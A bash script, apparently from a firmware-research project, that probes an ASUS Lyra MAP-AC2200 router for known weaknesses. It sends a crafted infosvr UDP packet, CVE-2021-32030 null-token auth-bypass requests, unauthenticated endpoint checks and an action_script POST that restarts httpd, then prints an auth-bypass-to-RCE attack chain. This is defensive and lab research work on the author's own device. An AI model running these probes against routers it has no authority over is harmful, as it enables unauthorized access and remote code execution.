#!/bin/bash
# ASUS Lyra MAP-AC2200 — Attack vector tests
# Run against a stock firmware device (white LED, 192.168.72.1 or 192.168.1.1)
# Tests known vulnerabilities WITHOUT exploiting them (safe probes only).
#
# Based on httpd RE from firmware 3.0.0.4.384_46630 (~/conwrt-re/httpd/analysis.md)
# and AiMesh protocol analysis (~/conwrt-re/aimesh/analysis.md)
set -euo pipefail

INTERFACE="${1:-en6}"
STOCK_IP="${2:-192.168.72.1}"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
RESULTSDIR="/tmp/conwrt-stock-lab"
mkdir -p "$RESULTSDIR"
RESULTSFILE="$RESULTSDIR/attack-test-${TIMESTAMP}.txt"

echo "=== ASUS Lyra MAP-AC2200 Attack Vector Tests ===" | tee "$RESULTSFILE"
echo "Interface: $INTERFACE  |  Target: $STOCK_IP  |  Time: $TIMESTAMP" | tee -a "$RESULTSFILE"
echo "" | tee -a "$RESULTSFILE"

# ─── Test 1: infosvr UDP 9999 (CVE-2014-9583) ─────────────────────
echo "--- Test 1: infosvr UDP 9999 discovery ---" | tee -a "$RESULTSFILE"

python3 -c "
import socket
target_ip = '$STOCK_IP'
pkt = bytearray(512)
pkt[0] = 0x0C  # NET_SERVICE_ID_IBOX_INFO
pkt[1] = 0x15  # NET_PACKET_TYPE_CMD
pkt[2] = 0x33  # NET_CMD_ID_GETINFO
pkt[3] = 0x00
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3)
try:
    sock.sendto(bytes(pkt), (target_ip, 9999))
    data, addr = sock.recvfrom(512)
    print(f'[!] RESPONSE from {addr[0]}:{addr[1]} - {len(data)} bytes')
    print(f'    ServiceID=0x{data[0]:02x} PacketType=0x{data[1]:02x} OpCode=0x{data[2]:02x}{data[3]:02x}')
    try:
        info = data[8:].split(b'\\x00')[0].decode('ascii', errors='replace')
        if info: print(f'    Info: {info}')
    except: pass
    print('[!] infosvr IS RUNNING — patched in 384 (ateCommand_flag check) but service exists')
except socket.timeout:
    print('[-] No response on UDP 9999')
except Exception as e:
    print(f'[-] Error: {e}')
finally:
    sock.close()
" 2>&1 | tee -a "$RESULTSFILE"

echo "" | tee -a "$RESULTSFILE"

# ─── Test 2: CVE-2021-32030 Null asus_token bypass ─────────────────
echo "--- Test 2: CVE-2021-32030 null asus_token auth bypass ---" | tee -a "$RESULTSFILE"

# Test 2a: Null-byte asus_token + asusrouter UA
RESP=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "asus_token=%00" \
  -H "User-Agent: asusrouter--" \
  "http://$STOCK_IP/apply.cgi" 2>/dev/null || echo "failed")
echo "  Null token + asusrouter UA → HTTP $RESP" | tee -a "$RESULTSFILE"
[ "$RESP" = "200" ] || [ "$RESP" = "302" ] && echo "  [!] VULNERABLE TO CVE-2021-32030" | tee -a "$RESULTSFILE"

# Test 2b: Empty asus_token
RESP2=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "asus_token=" \
  -H "User-Agent: asusrouter--" \
  "http://$STOCK_IP/apply.cgi" 2>/dev/null || echo "failed")
echo "  Empty token + asusrouter UA → HTTP $RESP2" | tee -a "$RESULTSFILE"

# Test 2c: No token at all + asusrouter UA
RESP3=$(curl -s -o /dev/null -w "%{http_code}" \
  -H "User-Agent: asusrouter--" \
  "http://$STOCK_IP/apply.cgi" 2>/dev/null || echo "failed")
echo "  No token + asusrouter UA → HTTP $RESP3" | tee -a "$RESULTSFILE"

# Baseline
RESP_BASE=$(curl -s -o /dev/null -w "%{http_code}" "http://$STOCK_IP/" 2>/dev/null || echo "failed")
echo "  Baseline GET / → HTTP $RESP_BASE" | tee -a "$RESULTSFILE"

echo "" | tee -a "$RESULTSFILE"

# ─── Test 3: IFTTT auth bypass (from httpd RE) ────────────────────
echo "--- Test 3: IFTTT token endpoint (httpd RE finding) ---" | tee -a "$RESULTSFILE"

# get_IFTTTtoken.cgi is in the unauthenticated handler list
RESP_IFTTT=$(curl -s -w "\n%{http_code}" "http://$STOCK_IP/get_IFTTTtoken.cgi" 2>/dev/null || echo -e "\nfailed")
HTTP_IFTTT=$(echo "$RESP_IFTTT" | tail -1)
BODY_IFTTT=$(echo "$RESP_IFTTT" | head -n -1)
echo "  get_IFTTTtoken.cgi → HTTP $HTTP_IFTTT" | tee -a "$RESULTSFILE"
[ -n "$BODY_IFTTT" ] && echo "  Body: $(echo "$BODY_IFTTT" | head -3)" | tee -a "$RESULTSFILE"

# Try with null ifttt_token cookie (CVE-2021-32030 IFTTT variant)
RESP_IFTTT2=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "ifttt_token=%00" \
  -H "User-Agent: asusrouter--" \
  "http://$STOCK_IP/get_IFTTTtoken.cgi" 2>/dev/null || echo "failed")
echo "  null ifttt_token → HTTP $RESP_IFTTT2" | tee -a "$RESULTSFILE"

echo "" | tee -a "$RESULTSFILE"

# ─── Test 4: Unauthenticated endpoint enumeration ─────────────────
echo "--- Test 4: Unauthenticated endpoint probe ---" | tee -a "$RESULTSFILE"

# These endpoints are in the httpd dispatch table (from RE)
# Some are expected to work without auth on factory-default
for endpoint in "findasus.cgi" "detwan.cgi" "QIS_wizard.htm" "start_apply.htm" "blocking_request.cgi" "send_IFTTTPincode.cgi"; do
    RESP_EP=$(curl -s -o /dev/null -w "%{http_code}" "http://$STOCK_IP/$endpoint" 2>/dev/null || echo "failed")
    if [ "$RESP_EP" = "200" ] || [ "$RESP_EP" = "302" ]; then
        echo "  [!] $endpoint → HTTP $RESP_EP (accessible)" | tee -a "$RESULTSFILE"
    else
        echo "  [-] $endpoint → HTTP $RESP_EP" | tee -a "$RESULTSFILE"
    fi
done

echo "" | tee -a "$RESULTSFILE"

# ─── Test 5: start_apply.htm (action_script injection probe) ──────
echo "--- Test 5: start_apply.htm action_script (SAFE probe only) ---" | tee -a "$RESULTSFILE"

# Test if start_apply.htm accepts POST with action_script on factory default
# This is the KNOWN vector we already use (curl SSH enable) — just confirming
RESP_APPLY=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST "http://$STOCK_IP/start_apply.htm" \
  -d "action_mode=apply&action_script=restart_httpd" \
  -H "Referer: http://$STOCK_IP/QIS_wizard.htm" 2>/dev/null || echo "failed")
echo "  POST start_apply.htm (restart_httpd) → HTTP $RESP_APPLY" | tee -a "$RESULTSFILE"
if [ "$RESP_APPLY" = "200" ] || [ "$RESP_APPLY" = "302" ]; then
    echo "  [!] start_apply.htm accepted — action_script injection chain possible" | tee -a "$RESULTSFILE"
    echo "  [!] Attack chain: IFTTT bypass → start_apply.htm → action_script RCE → sysupgrade" | tee -a "$RESULTSFILE"
fi

echo "" | tee -a "$RESULTSFILE"

# ─── Test 6: WiFi AP detection ────────────────────────────────────
echo "--- Test 6: WiFi AP detection ---" | tee -a "$RESULTSFILE"

AIRPORT="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
if [ -x "$AIRPORT" ]; then
    WIFI_SCAN=$("$AIRPORT" -s 2>/dev/null | grep -i "asus\|lyra\|MAP-AC" || true)
    if [ -n "$WIFI_SCAN" ]; then
        echo "[!] ASUS WiFi AP detected:" | tee -a "$RESULTSFILE"
        echo "$WIFI_SCAN" | tee -a "$RESULTSFILE"
    else
        echo "[-] No ASUS WiFi AP found in scan" | tee -a "$RESULTSFILE"
    fi
else
    echo "[-] airport utility not available" | tee -a "$RESULTSFILE"
fi

echo "" | tee -a "$RESULTSFILE"

# ─── Test 7: AiMesh TCP 7788 ──────────────────────────────────────
echo "--- Test 7: AiMesh cfg_server TCP 7788 ---" | tee -a "$RESULTSFILE"

if nc -z -w2 "$STOCK_IP" 7788 2>/dev/null; then
    echo "[!] TCP 7788 OPEN — AiMesh cfg_server listening!" | tee -a "$RESULTSFILE"
else
    echo "[-] TCP 7788 closed — AiMesh not active (expected on factory default)" | tee -a "$RESULTSFILE"
fi

echo "" | tee -a "$RESULTSFILE"

# ─── Test 8: HTTP fingerprint ─────────────────────────────────────
echo "--- Test 8: HTTP server fingerprint ---" | tee -a "$RESULTSFILE"

HEADERS=$(curl -s -I "http://$STOCK_IP/" 2>/dev/null || true)
echo "$HEADERS" | grep -i "server\|www-auth\|set-cookie\|asus\|x-\|etag" | tee -a "$RESULTSFILE" || echo "[-] No interesting headers" | tee -a "$RESULTSFILE"

echo "" | tee -a "$RESULTSFILE"
echo "=== Tests complete ===" | tee -a "$RESULTSFILE"
echo "Results saved to: $RESULTSFILE" | tee -a "$RESULTSFILE"
echo ""
echo "Attack chain priority (from httpd RE):"
echo "  1. IFTTT null-token auth bypass → start_apply.htm → action_script injection → RCE"
echo "  2. infosvr UDP 9999 (LAN only, patched but may respond to GETINFO)"
echo "  3. AiMesh impersonation (long-term, requires cfg_server active)"
